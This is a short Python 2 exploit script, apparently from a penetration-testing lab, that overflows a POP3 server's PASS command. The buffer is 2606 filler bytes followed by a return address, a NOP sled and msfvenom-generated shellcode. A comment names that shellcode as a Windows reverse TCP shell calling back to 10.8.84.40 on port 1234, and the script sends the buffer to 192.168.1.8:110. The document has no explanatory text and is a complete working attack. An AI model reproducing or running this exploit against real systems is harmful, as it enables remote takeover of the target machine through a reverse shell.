import struct

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buf = "A" * 2606 +  "\x8f\x35\x4a\x5f" + "\x90" * 30

#msfvenom -p windows/shell_reverse_tcp lhost=10.8.84.40 lport=1234 -a x86 -f python -b "\x00\x0a\x0d"


buf +=  b""
buf += b"\xda\xdb\xbb\x07\xa1\xb9\xf1\xd9\x74\x24\xf4\x5f\x2b"
buf += b"\xc9\xb1\x52\x31\x5f\x17\x03\x5f\x17\x83\xc0\xa5\x5b"
buf += b"\x04\x32\x4d\x19\xe7\xca\x8e\x7e\x61\x2f\xbf\xbe\x15"
buf += b"\x24\x90\x0e\x5d\x68\x1d\xe4\x33\x98\x96\x88\x9b\xaf"
buf += b"\x1f\x26\xfa\x9e\xa0\x1b\x3e\x81\x22\x66\x13\x61\x1a"
buf += b"\xa9\x66\x60\x5b\xd4\x8b\x30\x34\x92\x3e\xa4\x31\xee"
buf += b"\x82\x4f\x09\xfe\x82\xac\xda\x01\xa2\x63\x50\x58\x64"
buf += b"\x82\xb5\xd0\x2d\x9c\xda\xdd\xe4\x17\x28\xa9\xf6\xf1"
buf += b"\x60\x52\x54\x3c\x4d\xa1\xa4\x79\x6a\x5a\xd3\x73\x88"
buf += b"\xe7\xe4\x40\xf2\x33\x60\x52\x54\xb7\xd2\xbe\x64\x14"
buf += b"\x84\x35\x6a\xd1\xc2\x11\x6f\xe4\x07\x2a\x8b\x6d\xa6"
buf += b"\xfc\x1d\x35\x8d\xd8\x46\xed\xac\x79\x23\x40\xd0\x99"
buf += b"\x8c\x3d\x74\xd2\x21\x29\x05\xb9\x2d\x9e\x24\x41\xae"
buf += b"\x88\x3f\x32\x9c\x17\x94\xdc\xac\xd0\x32\x1b\xd2\xca"
buf += b"\x83\xb3\x2d\xf5\xf3\x9a\xe9\xa1\xa3\xb4\xd8\xc9\x2f"
buf += b"\x44\xe4\x1f\xff\x14\x4a\xf0\x40\xc4\x2a\xa0\x28\x0e"
buf += b"\xa5\x9f\x49\x31\x6f\x88\xe0\xc8\xf8\x77\x5c\xd3\xf1"
buf += b"\x1f\x9f\xd3\x05\x32\x16\x35\x6f\xa2\x7f\xee\x18\x5b"
buf += b"\xda\x64\xb8\xa4\xf0\x01\xfa\x2f\xf7\xf6\xb5\xc7\x72"
buf += b"\xe4\x22\x28\xc9\x56\xe4\x37\xe7\xfe\x6a\xa5\x6c\xfe"
buf += b"\xe5\xd6\x3a\xa9\xa2\x29\x33\x3f\x5f\x13\xed\x5d\xa2"
buf += b"\xc5\xd6\xe5\x79\x36\xd8\xe4\x0c\x02\xfe\xf6\xc8\x8b"
buf += b"\xba\xa2\x84\xdd\x14\x1c\x63\xb4\xd6\xf6\x3d\x6b\xb1"
buf += b"\x9e\xb8\x47\x02\xd8\xc4\x8d\xf4\x04\x74\x78\x41\x3b"
buf += b"\xb9\xec\x45\x44\xa7\x8c\xaa\x9f\x63\xbc\xe0\xbd\xc2"
buf += b"\x55\xad\x54\x57\x38\x4e\x83\x94\x45\xcd\x21\x65\xb2"
buf += b"\xcd\x40\x60\xfe\x49\xb9\x18\x6f\x3c\xbd\x8f\x90\x15"



try:

	print "\nSending evil buffer..."

	s.connect(('192.168.1.8',110))

	data = s.recv(1024)

	s.send('USER username' +'\r\n')

	data = s.recv(1024)

	s.send('PASS ' + buf + '\r\n')

	data = s.recv(1024)

	s.close()

except:

	print "Could not connect to POP3!"